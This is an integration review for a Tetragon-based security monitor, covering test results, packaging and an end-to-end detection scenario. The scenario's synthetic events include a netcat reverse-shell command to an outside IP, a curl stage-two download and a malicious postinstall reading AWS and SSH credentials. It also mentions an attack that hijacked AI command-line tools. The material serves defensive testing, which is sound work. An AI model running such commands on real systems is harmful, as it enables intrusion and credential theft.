# Integration review

Six components are built in parallel against `docs/CONTRACT.md`, `docs/BASELINE.md`
and `docs/LEARNING-AND-ANALYSIS.md`. This file records what happened when the
current change set was run against itself: what passes, what did not line up,
what was changed, and what is still open.

Everything below was produced on this machine, unprivileged, with no Tetragon
running and nothing installed into `/usr` or `/etc` by the review itself.

This is the second integration pass. The first one is superseded: the daemon
grew baselining, rarity, receipts, incident snapshots, the weekly digest and
four userland package-subtree rules; the kernel `pkg` family was deleted; and
the plugin grew a Timeline tab, an Allowlist tab with proposals, and the
analysis flow. Everything in section 4 below was found by running the new
daemon against the new plugin, not by reading them.

---

## 1. Suite results

Run everything with `tests/run-all.sh` (add `-x` to stop at the first failure).

| Suite | Command | Result |
|---|---|---|
| policies | `python3 policies/check.py` | **PASS** — 32 templates parse, render and match the verified v1.7.1 grammar (6 critical / 16 high / 9 medium / 1 low; 7 enforcing, 25 monitor-only) |
| scanner | `python3 -m unittest discover scanner/tests` | **PASS** — 39 tests |
| shell | `bash shell/tests/run-tests.sh` | **PASS** — 9 QML files parse; `tst_model` 90 tests; `tst_wire` 36 tests (rewritten, see §3) |
| manifest | `omarchy-plugin-validate` | **PASS** — silent, exit 0 (see §4, T1: it was not actually running before) |
| sandbox | `bash sandbox/tests/run.sh` | **PASS** — 53 tests |
| moatd | `cd moatd && cargo test --release` | **PASS** — 299 lib tests + 4 `moatctl` tests + 5 integration tests (`tests/dev_run.rs`, which runs `moatd/dev-run.sh` end to end) |
| package | `cd pkg && makepkg -f` | **PASS** — full check phase, `omarchy-moat-0.1.0-1-x86_64.pkg.tar.zst`, 76 MB |

`tests/run-all.sh` skips `omarchy-plugin-validate` with a notice when it is not
on `$PATH`. Every other suite is a hard gate, and so is a validator that is
present and unhappy — which it was not before this pass (T1).

---

## 2. What was added to the package

`docs/CONTRACT.md` §2 predates BASELINE and LEARNING, so the packaging agent had
no line to copy for the files those two documents introduced. Diffing the
`package()` install list against §2 plus BASELINE §3 and LEARNING §4/§5 left four
gaps, all now closed in `pkg/PKGBUILD`:

| path | mode | why |
|---|---|---|
| `/etc/moat/allowlist.d/omarchy-default.toml` | 0644, `backup=` | LEARNING §8's shipped baseline. It is what keeps `cargo test` from raising a critical alert on the machine that develops moat, so shipping without it makes the developer experience teach the user to ignore alerts. A `backup=` entry because it is still a file under `/etc` a site admin may narrow — an edit becomes a `.pacnew` rather than being silently reverted. |
| `/usr/lib/systemd/user/moat-digest.service` | 0644 | LEARNING §5. A **user** unit: desktop notifications belong to the session bus, which a root service does not have. |
| `/usr/lib/systemd/user/moat-digest.timer` | 0644 | Same. Installed, never enabled — `.install` prints the one command. |
| `/usr/share/doc/omarchy-moat/{BASELINE,LEARNING-AND-ANALYSIS}.md` | 0644 | `/etc/moat/moat.toml`'s own comments cite these by section number for `[baseline]`, `[learning]`, `[analysis]`, `[incidents]` and `[digest]`. |

**The tmpfiles entry for `/var/lib/moat/incidents` was already correct.** It
lives in `moatd/systemd/tmpfiles.d/moat.conf`, which `package()` already
installed, at `0750 root:moat` — group-readable on purpose, unlike
`quarantine` at `0700 root:root`, because the panel and the user's agent have to
read `bundle.md`. Verified in the built package:

```
$ tar xOf omarchy-moat-0.1.0-1-x86_64.pkg.tar.zst usr/lib/tmpfiles.d/moat.conf | grep incidents
d /var/lib/moat/incidents        0750 root moat -   -
```

`allowlist.d/baseline.toml` is deliberately **not** shipped: BASELINE §3 makes it
runtime state the daemon writes, and a packaged copy would be reverted on every
upgrade.

The rest of the install list matches CONTRACT §2 exactly. Confirmed against the
built artifact:

```
$ cd pkg && makepkg -f && tar tf omarchy-moat-0.1.0-1-x86_64.pkg.tar.zst
...
etc/moat/allowlist.d/default.toml
etc/moat/allowlist.d/omarchy-default.toml         <- new
usr/lib/moat/policies/*.yaml                      (32)
usr/lib/tetragon/bpf/*.o                          (94, unstripped)
usr/lib/systemd/system/{tetragon,moatd,moat-feeds}.service, moat-feeds.timer
usr/lib/systemd/user/moat-digest.service          <- new
usr/lib/systemd/user/moat-digest.timer            <- new
usr/lib/tmpfiles.d/moat.conf
usr/share/doc/omarchy-moat/BASELINE.md            <- new
usr/share/doc/omarchy-moat/LEARNING-AND-ANALYSIS.md   <- new
```

`pkg/omarchy-moat.install` gained the digest step
(`systemctl --user enable --now moat-digest.timer`, explicitly *without* sudo
and with the off switch named), the matching `pre_remove` line, and a spelled-out
upgrade caveat: **restart tetragon and moatd together, tetragon first.**
`moatd.service` is `Requires=`+`After=` `tetragon.service`, so restarting moatd
alone leaves it reading a log the old sensor is still writing under the old
policy set, and restarting tetragon alone leaves moatd holding the previous
policies' annotations — alerts would carry titles, severities and `why` text for
policies that no longer exist.

---

## 3. End to end, unprivileged

`moatd/dev-run.sh` is the base: no root, no `/etc`, no `/run`, no Tetragon,
every path overridden on the command line. The scenario below extends it to the
**real** 32 templates from `policies/`, a fake home, and a synthetic Tetragon
export that exercises the BASELINE/LEARNING machinery. It is checked in and
reproducible:

```
shell/tests/capture-wire-fixtures.sh          # runs the daemon, captures §3 and §4
shell/tests/gen-export-log.py                 # the synthetic export it replays
```

Two config keys move off their shipped defaults, both real knobs and both for
the fixtures' benefit: `learn_min_days = 1` (see open issue 1) and
`noisy_rule_per_day = 5` (the guard is the same code path at either threshold,
and a 21-alert burst tripled the size of the fixtures).

### Render

```
$ moatd render-policies --templates-dir policies/ --out-dir $D/policies \
      --export-allowlist $D/export-allowlist --home /home/moattest
rendered 32 policies into $D/policies (32 changed, export-allowlist updated)
    {{HOME}} left over: 0 file(s)
    /home/moattest present in: 15 file(s)

$ cat $D/export-allowlist
{"event_set":["PROCESS_EXEC","PROCESS_EXIT"]}
{"event_set":["PROCESS_KPROBE","PROCESS_LSM","PROCESS_TRACEPOINT","PROCESS_UPROBE"],
 "policy_names":["moat-cred-ai-credentials-read", ... 32 names ... ]}
```

### The scenario

One live `sleep` stands in for the acting process of the critical pkg-install
alert, so the incident snapshot reads a real `/proc`; everything else uses pids
picked to be free. Timestamps are Tetragon's, nanosecond RFC3339.

| # | event | what it exercises |
|---|---|---|
| 1 | `alacritty → fish → node deploy.mjs` reads `~/.aws/config` | cred read, **interactive** chain |
| 2 | `alacritty → fish → node npm-cli.js install → sh → node setup.mjs` reads `~/.aws/credentials` | the same read, **pkg-install** chain |
| 3 | the `sh` in that chain | userland `moat-pkg-subtree-interpreter-spawn` |
| 4 | `node steal.mjs` reads `~/.ssh/id_ed25519`, event carries `KPROBE_ACTION_SIGKILL`, then `process_exit signal SIGKILL` | an enforcing policy, and CONTRACT §3's "confirm the kill from the exit event" |
| 5 | `nc -e /bin/sh 185.220.101.55 4444` under the install | userland `moat-pkg-subtree-netcat-exec` |
| 6 | `curl http://185.220.101.55:8080/stage2.sh` + its `tcp_connect` | userland `downloader`, kernel `net-suspicious-port-egress`, userland `moat-x-pkg-egress` |
| 7 | the package root exits | LEARNING §3 install receipt |
| 8 | `systemd → restic` writes `~/.bashrc` | official actor, `service` context |
| 9 | `restic` writes four `~/.local/share/applications/*.desktop` | provenance downgrade, and a **learned** baseline entry |
| 10 | seven writes under `~/.config/omarchy/extensions/` | BASELINE §4 noise guard |
| 11 | `baseline relearn --days 0`, then four `~/.config/omarchy/plugins/…` writes by `restic` | BASELINE §3 **proposal** |

`restic`, `node`, `npm`, `sh` and `bash` resolve through the fake
`moatd/testdata/pacman-local` database, so provenance really is computed rather
than stubbed.

### Status

```
$ moatctl status
moatd  0.1.0   mode monitor
tetragon   running
policies   32
feeds      0 hashes, 0 domains, updated never
unacked    critical 1  high 5  medium 2  low 16
sandbox    off
socket     group moat   uptime 4s   40 events, 25 alerts
baseline   learning window closed   1 proposal(s), 1 learned entry
demoted    moat-persist-omarchy-menu-extension-write   (timeline only)
```

### The context matrix produced exactly what BASELINE §2b promises

This is the check the whole scenario exists to make: the **same rule**, the
**same actor binary**, the **same directory**, one step apart in the process
tree. (Different file inside `~/.aws` only because the 60 s dedupe window keys
on rule+exe+file and would otherwise fold the two into one alert — which is
itself correct, just not what is being shown.)

| | interactive | pkg-install |
|---|---|---|
| rule | `moat-cred-cloud-credentials-read` | same |
| actor exe | `/usr/bin/node` | same |
| `severity_base` | high | high |
| **`severity`** | **medium** | **critical** |
| `severity_reason` | `high → medium: interactive context: node/python reads ~/.aws/credentials, ~/.config/gh/hosts.yml` | `high → critical: pkg-install context: …` |
| `surface` | timeline | alerts |
| incident snapshot | none | 5 files |

BASELINE §2b's table says medium and **critical**. Both match. The other rows
the capture lands on:

| alert | base → final | why |
|---|---|---|
| `moat-persist-desktop-entry-write` (restic) | medium → **low** | `actor is official (package restic 0.18.1-1)` — no matrix row claims `~/.local/share/applications`, so BASELINE §2's provenance step is the only thing acting |
| `moat-persist-shell-rc-write` (restic) | high → **high** | the `persist-user-startup` row scores `service` at high and the matrix is absolute: *"service context downgrades nothing; it is where persistence lives"* |
| `moat-cred-ssh-private-key-read` | high → **high** | `stays high: package install: never downgraded` |
| `moat-pkg-subtree-netcat-exec` | critical → **critical** | on `NEVER_LOWERED` |
| `moat-net-suspicious-port-egress` | medium → **high** | raised because the connecting process is in a package subtree (policies/README "what the first live run changed") |

### Explain, trimmed

```
$ moatctl explain 01M1ME4KXMXWCDBX4X95MYS51V
Cloud or cluster credentials read by an unexpected program
==========================================================
moat-cred-cloud-credentials-read (critical)   2026-09-03T20:07:37.144Z

WHAT HAPPENED
  node read your AWS credentials (credentials).
  process: /usr/bin/node (pid 3947803, uid 1000)
  args:    /home/moattest/proj/node_modules/evil/setup.mjs
  parents: alacritty (30001) -> fish (30005) -> node (30006) -> sh (30007)
  file:    /home/moattest/.aws/credentials

EVIDENCE
  - hook: file_post_open on /home/moattest/.aws/credentials (read)
  - actor: user (an interpreter takes the provenance of its script,
    /home/moattest/proj/node_modules/evil/setup.mjs)
  - context: pkg-install
  - rarity: rare — /usr/bin/node has read /home/moattest/.aws: seen 2 times since 2026-09-03
  - severity: high → critical: pkg-install context: node/python reads ~/.aws/…
    [matrix row cred-cloud-read]
  - context: pkg-install — inside a `node` subtree (matched on argument
    `npm-cli.js`); a package install is never downgraded
  - not in allowlist: none of the 0 rule(s) in .../allowlist.d matches …

IF THIS IS EXPECTED  … (recommended scope: exe; 4 scopes, each with its TOML)
WHAT TO DO           … 6 steps
  secrets to rotate: aws-key, gcp-token, azure-token, kubeconfig
```

### Allowlist, with all three origins

```
$ moatctl allowlist
  1  moat-persist-desktop-entry-write  [learned]
     # learned 2026-09-03: seen 4 times on 1 distinct day (…), actor official
     #   (restic 0.18.1-1), context service, rarity common
     exe = /usr/bin/restic   file = …/applications/*   parent = /usr/lib/systemd/systemd
     from .../allowlist.d/baseline.toml
  1  moat-exec-untrusted-tmpfs  [shipped]
     … from .../allowlist.d/omarchy-default.toml (shipped, not removable)
  … 3 more shipped …
  1  moat-cred-cloud-credentials-read  [user]
     # added 2026-09-03 from alert 01M1ME4KXM…: … — wire fixture
     exe = /usr/bin/node
     from .../allowlist.d/user.toml

Remove one with `moatctl unignore <index>` (user.toml) or
`moatctl unignore <index> --file baseline.toml` for a learned entry.
```

**Every file numbers from 1 independently.** That is what BASELINE §8 means by
"`index` (position within that file)", and it is why `unignore` takes
`{file, index}` — see mismatch P1.

### Baseline: learned, proposed, demoted

```
$ moatctl baseline list
learning window closed on 2026-09-03T20:07:38.000Z — recurring patterns become proposals

1 pattern(s) to review:
  01M1ME4NACVF1XYFBR0E3A64C3  moat-persist-omarchy-plugin-write
    /usr/bin/restic /home/moattest/.config/omarchy/plugins/backup-restore
      — 4 times on 1 day(s)
      [[rule]]
      name = "moat-persist-omarchy-plugin-write"
      exe = "/usr/bin/restic"
      file = "/home/moattest/.config/omarchy/plugins/backup-restore/*"
      parent = "/usr/lib/systemd/systemd"
    accept: moatctl baseline accept 01M1ME4NACVF1XYFBR0E3A64C3   dismiss: …

1 learned entry
  moat-persist-desktop-entry-write  /usr/bin/restic  (written 2026-09-03T20:07:37.168Z)

demoted (timeline only): moat-persist-omarchy-menu-extension-write
  back to watching: moatctl baseline undemote <rule>

$ moatctl baseline export
# moat baseline export  2026-09-03T20:07:40.125Z  machine mars  13 tuple(s)
# only `official` provenance is ever eligible to ship (LEARNING §8 step 2).
rule                                       prov      context      count days  actor / dir
moat-persist-omarchy-menu-extension-write  user      interactive  7     1     /usr/bin/node …/extensions [demoted]
moat-persist-desktop-entry-write           official  service      4     1     /usr/bin/restic …/applications [learned]
moat-persist-omarchy-plugin-write          official  service      4     1     /usr/bin/restic …/plugins/backup-restore
moat-cred-cloud-credentials-read           user      interactive  2     1     /usr/bin/node /home/moattest/.aws
moat-cred-cloud-credentials-read           user      pkg-install  1     1     /usr/bin/node /home/moattest/.aws
… 8 more …
```

Suppressed and demoted tuples are included and marked, as LEARNING §8 step 1
requires, and the header states the reviewer's rule rather than leaving it to be
remembered.

### Receipt, incidents, bundle

```
$ moatctl receipts --last 5
01M1ME4KYDM4BAFNBTN24DSX08  2026-09-03T20:07:00.737Z
  node /usr/lib/node_modules/npm/bin/npm-cli.js in /home/moattest/proj (37 s, exit 0)
    postinstall scripts: 1 (evil)
    wrote outside the project: none
    network: 185.220.101.55
    credential reads: /home/moattest/.aws/credentials, /home/moattest/.ssh/id_ed25519
      · persistence writes: none
    binaries executed from the tree: 0 · from /tmp: 0

1 receipt(s). Receipts never notify and are never counted.

$ moatctl incidents --last 5
01M1ME4KXVB39VX1KJ46JWDRNF  critical  Package install ran netcat or socat
    /var/lib/moat/incidents/01M1ME4KXVB39VX1KJ46JWDRNF   captured …
      file/nc       39512 bytes  88e2c5b80863
      net.txt       219 bytes    de7601eaf2de
      pkg.json      119 bytes    b278e2e42ab4
      process.json  910 bytes    0948951604c3
      tree.txt      612 bytes    194855a1e915
… 4 more …
5 snapshot(s), kept 30 days or 200 of them. `moatctl analyze <id>` reads one.

$ moatctl bundle 01M1ME4KXMXWCDBX4X95MYS51V --json
{"id":"01M1ME4KXM…","path":"/var/lib/moat/incidents/01M1ME4KXM…/bundle.md","ok":true}
```

`bundle.md` (8.4 KB) opens with the untrusted-data preamble, then
`## What happened / Ancestry / Who acted, and how unusual it is / Why it was
flagged / Evidence / When this is expected / What to do if it was not expected /
Related timeline (same process tree, ±5 minutes) / Incident snapshot`. Every
process-derived string — binary, argv, cwd, file path, each ancestor — sits
inside a ` ```DATA ` fence. `tst_wire.qml` asserts that the acting process's
argv is inside a fence, not loose in prose (LEARNING §2.3: the s1ngularity attack
drove the victim's own AI CLIs, so an alert about a malicious postinstall must
not become an injection channel into the agent analyzing it).

```
$ moatctl rarity 01M1ME4KXM…
rare  /usr/bin/node has read /home/moattest/.aws: seen 2 times since 2026-09-03

$ moatctl digest
moat: 7 incidents, 1 install watched, 1 baseline proposal to review
  on   next 2026-09-07T13:00:00.000Z   never sent
```

### Not exercised: the three-day learning rule

BASELINE §3's real condition is a tuple recurring on **3 distinct days**, and
**the daemon exposes no clock override**: `Engine::note_baseline` stamps the
observation with `util::now_rfc3339()` — wall clock — not with the event's own
timestamp, so three days cannot be faked from inside one run no matter what the
synthetic export says. The capture sets `learn_min_days = 1`, which is a real
config key, and exercises everything else about the path (eligibility on
severity, provenance and rarity; the write to `baseline.toml`; the comment; the
proposal after the window closes). The multi-day arithmetic itself is covered
only by `moatd`'s own unit tests. See open issue 1.

---

## 4. The wire harness, and the mismatches it found

`shell/tests/tst_wire.qml` (36 tests) runs `MoatModel.js` over the fixtures the
capture above wrote — real daemon output, not hand-written examples of what it
ought to look like. `tst_model.qml` checks the model's own rules; `tst_wire.qml`
checks the seam. Fourteen fixtures: `alerts.jsonl` plus `status`, `list`,
`explain`, `allowlist`, `ignore`, `set mode`, `set sandbox`, `baseline list`,
`baseline export`, `receipts`, `incidents`, `bundle` and the `bundle.md` itself.
Only two substitutions are applied — the scratch directory becomes the installed
paths from CONTRACT §2, and the socket group becomes `moat`.

The tests cover what the review brief asked for: alerts with
`actor`/`context`/`severity_base`/`surface`/`rarity`/`incident`, receipts,
`status` with `baseline`/`proposals`/`demoted_rules`/`digest`, `allowlist` with
`source`/`removable`, and bundle path parsing — plus the §2b matrix comparison
above, which is now a test rather than a paragraph.

Five of the seven mismatches below were found by writing it.

### P1 — a Remove button on rules the daemon refuses to remove (fixed, plugin)

BASELINE §8 gives every allowlist entry a `source` (`user` | `learned` |
`shipped`), an `index` that is **per file**, and a `removable` flag, and says
shipped entries report `removable: false`. The plugin used none of the three:

* `normalizeAllowlistRule` derived `removable` from *"did the daemon give it an
  index"*. Shipped entries carry an index like everyone else, so all four
  `omarchy-default.toml` rules rendered with a **Remove** button. Pressing it
  called `unignore` — which the daemon refuses for that file.
* Worse, `Service.unignore(index)` sent `moatctl unignore <index>` with no
  `--file`, which defaults to `user.toml`. The learned entry and the user entry
  are **both index 1**, in different files. Removing the learned one would have
  removed the user's own rule instead.
* `sourceFile` fell back to `r.source` when `r.path` was absent — but `source`
  is now a word (`"shipped"`), not a path, so the panel would have printed
  `from shipped — edit that file to remove it`.

Fixed on the plugin side (`CONTRACT.md` and `BASELINE.md` both already say what
the daemon does): `normalizeAllowlistRule` honours `removable` and `source`,
exposes `sourceName` (the bare fragment name `--file` takes) and `shipped`;
`allowlistSections` returns three sections; `AllowlistView.qml` gained a
**SHIPPED WITH THE PACKAGE** section that lists the entries with their reason and
no button; `removeRequested(index, file)`, `Panel.requestUnignore(index, file)`
and `Service.unignore(index, file)` carry the fragment with the index.

### P2 — the panel never saw an incident snapshot (fixed, plugin)

The daemon writes the alert line **first** and the snapshot arrives moments
later as `{"v":1,"id":"…","update":{"incident":{…}}}` — it has to, because the
directory is named after the alert id. `MoatModel.js`'s `UPDATABLE` whitelist
did not include `incident`, so every alert read from `alerts.jsonl` had
`incident: null` while the same alert fetched over `list` had the block. The
panel's INCIDENT SNAPSHOT section, the file list and the bundle path were dead
for the tailing path — i.e. always, since that is how the plugin normally reads.

`incident` added to `UPDATABLE`, normalized through `normalizeIncident`, and
never allowed to null out a snapshot already recorded. This is exactly the class
of bug the wire fixtures exist for: both sides were individually correct and the
seam was not.

### P3 — the noise-guard alert lost both of its actual options (fixed, plugin)

BASELINE §4 says `moat-x-noisy-rule` carries "an `if_expected` option that
proposes baseline entries for exactly those tuples, and a 'keep watching' option
that clears the demotion". The daemon ships them as `if_expected.options` entries
with scopes `these-are-expected` and `keep-watching`, each with its own `cmd`
(`moatctl baseline propose --rule …`, `moatctl baseline undemote …`).

`normalizeIfExpectedOption` returns `null` for any scope outside CONTRACT §5's
four, and `normalizeIfExpected` dropped those silently — so the one alert whose
entire purpose is to offer those two choices rendered two **Ignore** buttons and
nothing else.

Fixed on the plugin side, and deliberately not by widening the ignore scopes:
non-ignore options are collected into `if_expected.other`, exposed as
`Model.otherOptions(alert)`, and `AlertDetail.qml` prints each one's label,
command and TOML. They stay out of `options`, because everything that reads
`options` builds a `moatctl ignore --scope <scope>` command from it, and the
plugin's action surface is deliberately the four verbs in `Service._argvFor` —
inventing a fifth from a string the daemon sent is the widening that
"actions name alert ids, never paths" exists to prevent.

### P4 — `receipts` over the socket normalized to an empty receipt (fixed, plugin)

In `alerts.jsonl` a receipt is wrapped: `{"v":1,"receipt":{…}}` (LEARNING §9).
The `receipts` socket command answers with the same objects **unwrapped** inside
a `receipts` array. `normalizeReceipt` looked only for `record.receipt`, so a
socket entry produced a receipt with no exe, no cwd and duration 0.

The plugin normally reads receipts out of the log — which is what makes
"receipts never notify and are never counted" true by construction — so nothing
was visibly broken; this was a trap for the fallback path. `normalizeReceipt`
now accepts either shape and `receiptsFromResponse()` parses the response.

### P5 — a raw NUL byte in `MoatModel.js` (fixed, plugin)

`timelineGroups` builds its group key by joining the rule and the actor exe with
a NUL separator, and that separator had been written as a **literal NUL byte**
rather than as an escape. It ran fine, but `file(1)` reported `MoatModel.js` as
`data`, and `grep`, `diff` and every other text tool treated the whole file as
binary — `grep -n function shell/MoatModel.js` returned nothing at all, on a
1900-line file full of functions. Replaced with the six-character escape
`\u0000`: identical at runtime, and the file is UTF-8 text again.

### T1 — the manifest suite was not running (fixed, harness)

`tests/run-all.sh` had:

```bash
command -v omarchy-plugin-validate >/dev/null && omarchy-plugin-validate . \
  || { echo "omarchy-plugin-validate not installed, skipped"; }
```

The `||` catches a validator that ran and **failed** just as happily as one that
is missing, and prints "not installed" either way. It was failing:

```
omarchy-plugin-validate: symlinks are not allowed inside a plugin folder:
  ./pkg/src/tetragon-v1.7.1-amd64.tar.gz
```

The plugin folder is the repository root, and a local `makepkg` run leaves
`pkg/src/` and `pkg/pkg/` behind — gitignored build scratch containing a symlink
to the downloaded Tetragon tarball. A fresh clone, which is what
`omarchy plugin add` produces, has neither. So `run-all.sh` now validates a copy
of the tree with the build artifacts excluded, a missing validator skips
explicitly, and a present-but-unhappy one fails the suite.

### S1 — a sandbox test that only passed when moat was not installed (fixed, test)

*"makepkg warns and continues when the scanner is missing"* deleted its stub
`moat-scan-pkgbuild` and then ran the shim with `/usr/bin` still on `$PATH`. On
any machine where the `omarchy-moat` package is installed — including the one
that develops it — `/usr/bin/moat-scan-pkgbuild` was found and the case silently
tested the opposite of its name. Caught by the assertion, which reported
`got: clean: no findings`.

The case now builds a symlink farm of `/usr/bin` with the scanner removed and
uses that as the system bin directory. It lives under `$PWD` rather than
`$TMPROOT` because the sandbox mounts `/tmp` as a tmpfs and binds `$PWD`, so a
farm under `$TMPROOT` is invisible to the real `makepkg`'s own
`#!/usr/bin/env bash`. 53 tests still, all passing, and now for the right reason.

### C1 — `CONTRACT.md` §5's `status` example was stale (fixed, contract)

Two corrections, both to the example rather than to any behaviour:

* `"policies":17` → `32`. The `pkg` family was deleted and
  `net-pkg-subtree-egress` renamed; `policies/` holds 32 templates.
* `"group_ok":true` → `"socket_group":"moat"`. The daemon has always shipped
  `socket_group` and argues, correctly, that "is the caller in the group" is
  unanswerable from the daemon side — a client that was not in it could not have
  reached the socket to ask. The previous review flagged this and left it to
  "someone with authority over CONTRACT.md"; this pass made the edit and added a
  paragraph saying why, plus a pointer to BASELINE §8 and LEARNING §9 for the
  fields those documents add to the same response.

### Stale references swept

`moat-pkg-subtree-{interpreter-spawn,downloader,netcat-exec}` and
`moat-ai-cli-in-pkg-subtree` survive as **userland rule ids** with unchanged
severities, so every mention of them in `moatd/README.md`, `moatd/src/`,
`etc/allowlist.d/omarchy-default.toml`, `docs/CONTRACT.md` §6.4 and
`policies/README.md` is correct as written and was left alone. What was stale:

| where | was | now |
|---|---|---|
| `shell/tests/fixtures/wire/set-mode-no-tetra.json` | listed `moat-net-pkg-subtree-egress` and three `moat-pkg-subtree-*` **policies** among the 32 the daemon tried to set | regenerated from the real daemon; the 32 names are the 32 templates |
| `shell/tests/fixtures/wire/*` (all) | the previous review's capture, from a daemon without baselining | regenerated |
| `shell/tests/tst_wire.qml` | asserted against those fixtures | rewritten |
| `docs/CONTRACT.md` §5 | `policies: 17` | 32 (C1) |
| `docs/INTEGRATION.md` | the whole file | this one |

`policies/export-allowlist.example`, `policies/README.md` and
`policies/net-suspicious-port-egress.yaml` were already correct: the shipped
export-allowlist lists exactly the 32 current names, and the README's "what the
first live run changed" section already documents the deletion and the rename.

---

## 5. Seam checks that passed

**(a) The context matrix.** §3 above. Both halves of BASELINE §2b's first row,
plus the provenance row and the "service downgrades nothing" rule, produced the
documented severities against the real policies and the real pacman fixture.

**(b) Policy annotations ↔ the daemon's loader.** `policies/check.py` requires
`severity`, `title`, `enforce`, `actions`, `why`, `expected` and `fp-hint` (with
`rotate` optional) and all 32 policies carry all seven. Every alert in the
capture has a non-empty `explain.what` / `why` / `expected`, at least three
evidence lines and at least two `next` steps — no policy falls through to a
daemon fallback.

**(c) The rotate vocabulary.** All 20 kinds the policies annotate resolve to
specific guidance on both sides; `tst_wire` asserts none of them lands on the
generic fallback, and the four-kind cloud policy produces four specific rows.

**(d) Allowlist round trip.** `ignore --scope exe` wrote the block, acked the
alert, and the block it returned is byte-identical to the one `allowlist` lists
and the one `explain`'s `if_expected` advertised — they all come from one
`render_block()`. Asserted in `tst_wire`.

**(e) The kill confirmation.** The SSH-key policy carries `matchActions Sigkill`,
so the event reported `KPROBE_ACTION_SIGKILL` — which in monitor mode means
nothing on its own. The daemon recorded `action_taken: killed` only after the
matching `process_exit` reported `SIGKILL`, as an update line, and the fold
applies it. The snapshot was taken before the kill and outlived the process.

**(f) The noise guard.** Seven alerts from one rule tripped the threshold; the
rule was demoted, one `moat-x-noisy-rule` alert was raised naming it, every
subsequent alert of that rule stays in the log with its severity, moves to the
timeline, and is not counted in the badge. `tst_wire` asserts the badge shrinks
and that no alert of the demoted rule notifies at any threshold — while the
guard's own alert notifies once, which is the single deliberate exception in
`shouldNotify`.

**(g) `surface`.** BASELINE §8 puts `surface` on the record; the plugin computes
its own from severity + suppression + the live `demoted_rules` list. `tst_wire`
now asserts the two agree on every alert the daemon wrote. They do, on all 25.

**(h) `set mode` with no `tetra`.** The socket still answers `ok:true` with
`applied: 0`, but `moatctl` now exits non-zero and says so in words
(*"mode enforce was NOT applied to any policy (32 loaded)"*), and
`Service.qml` still treats `policies > 0 && applied == 0` as a failure. The CLI
half of open issue 2 from the previous review is closed.

**(i) Absolute paths vs CONTRACT §2.** Re-checked after the additions: the
daemon's defaults, `moatd/etc/`, `moatd/systemd/`, `policies/tetragon.conf.d/`,
`policies/tetragon.service`, the shims, the profile.d snippets and the plugin's
hardcoded `/usr/bin/moatctl`, `/var/lib/moat/alerts.jsonl`,
`/etc/moat/allowlist.d/user.toml` and `/var/lib/moat/incidents` all agree with
§2 and with the built package.

---

## 6. Open issues

1. **The 3-distinct-days learning rule cannot be exercised end to end.**
   `Engine::note_baseline` stamps each observation with `util::now_rfc3339()`,
   the wall clock, rather than with the event's own `time`. Everything else in
   the daemon reads time from the event, so a synthetic export can replay a week
   — except this. A `--now` / `MOAT_NOW` override on `moatd run`, or simply
   using the finding's timestamp for the day stamp, would make BASELINE §3
   testable against a real daemon instead of only in unit tests. The capture
   works around it with `learn_min_days = 1`.

2. **RESOLVED.** `set mode` answers `ok:false` with the per-policy failures
   when it applied to zero policies, while still persisting the mode so a
   restart does not forget the intent. `set mode … --rule NAME` arms a single
   policy in the kernel and deliberately leaves the daemon-wide mode alone, so
   the userland kill path stays off; `status` lists `enforcing_rules`. This was
   a prerequisite for ever turning enforcement on: seven shipped policies carry
   Sigkill, and arming them together on a desktop kills the module loader on
   USB hotplug and kills `ssh` for reading your own key.

   ~~**`set mode` still answers `ok:true` when it applied to zero policies.**~~
   `moatctl` and the plugin both now report it as a failure, so no user is
   misled, but the socket response itself still says `ok`. The honest fix is
   daemon-side: keep persisting the mode, answer
   `{"ok":false,"error":"…","mode":"enforce","applied":0}`. Left to the moatd
   owner; it would need `set_mode_persists_even_when_tetra_is_missing` rewritten.

3. **`quarantine` is still not exercised against a live daemon.** The fake home
   has no real files, so only the refusal path is covered here. The move, the
   `chmod 000` and the `meta.json` are covered by `moatd`'s unit tests.

4. **The feeds seam is untested against the live aggregator.** `moat-feeds`
   with no verifiable index is a clean no-op and `status.feeds` reads `never`,
   which the plugin renders correctly. The full path — pointer, artifact,
   ed25519 verification, apply — is covered end to end against a local fixture
   server, including the tamper cases (a swapped artifact under a stale
   signature is refused, and the previous index survives). What is *not*
   covered is the real deployed aggregator, which does not exist yet.

5. **`process_uprobe` is in the export-allowlist but the daemon does not parse
   it.** No shipped policy uses a uprobe, so the events would be silently
   ignored if one ever landed. Three lines in `RawEvent` whenever that happens.

6. **The makepkg shim's "continue anyway" is not recordable.** Answering *y* at
   the `gum confirm` prompt continues but writes nothing, so the next `makepkg`
   in the same directory prompts identically. Offering to append the
   `~/.config/moat/scanner-allow.conf` line would close the loop, the way
   `moatctl ignore` does for alerts.

7. **RESOLVED for suppression, still latent for demotion.** A suppressed
   alert was recorded `surface: "alerts"` while the plugin correctly showed it
   on the timeline and never notified — confirmed live on 2026-09-03, 38
   allowlisted omarchy-shell plugin execs. `explain.rs` now forces `timeline`
   when `suppressed_by` is set, matching what the plugin recomputes, and the
   contract test asserts nothing suppressed reaches the Alerts tab.

   **RESOLVED for demotion too (2026-09-05).** The rest of this item read: "a
   demoted rule's alerts land in the Alerts tab when the panel has no status,
   because the demotion lives in `status.demoted_rules` and a reader working
   from `alerts.jsonl` alone has only the record's own `surface`". The daemon
   now stamps `surface` for every reason it has — suppression, a noise-guard
   demotion, the `signal` tier, and the package-install escalation that
   outranks the last two — in one function (`scoring::final_surface`), and
   restamps the backlog a demotion covers (`engine::quieten_backlog`). The
   panel reads the stamp and no longer applies `status.demoted_rules`
   retroactively, so the record and the screen answer from the same field.

8. **Cross-process `/proc/<pid>/environ` reads are not covered.** The technique
   is real credential theft — the environment holds `GITHUB_TOKEN`,
   `AWS_SECRET_ACCESS_KEY` and database URLs with the password inline — but a
   rule for it flags *process enumeration*, which is ordinary on a developer
   desktop: `pgrep`, `herdr` and `quickshell` all do it, and silencing them
   would mean allowlisting the desktop shell, which is where a hijacked plugin
   runs. Measured at 126 high alerts in four idle minutes. The rule, the
   working self-read filter (`moatd/src/rules/self_proc_read.rs`) and the full
   evidence are parked in `policies/incubating/`; what it needs is target
   awareness — alerting on whose environment is read, not merely that one was.
   Not a regression: the previous shape alerted on everything and was
   permanently demoted, which is not coverage either.

9. **`shell/tests/fixtures/wire/list.json` is 120 KB.** Real daemon output with
   a full `explain` block per alert is bulky, and 25 alerts is already the
   trimmed scenario. If it becomes a problem, capture `list --limit` with a
   filter rather than hand-editing the fixture — it is only worth anything while
   it is byte-for-byte what the daemon wrote.

---

## 7. Files changed by this review

| File | Change |
|---|---|
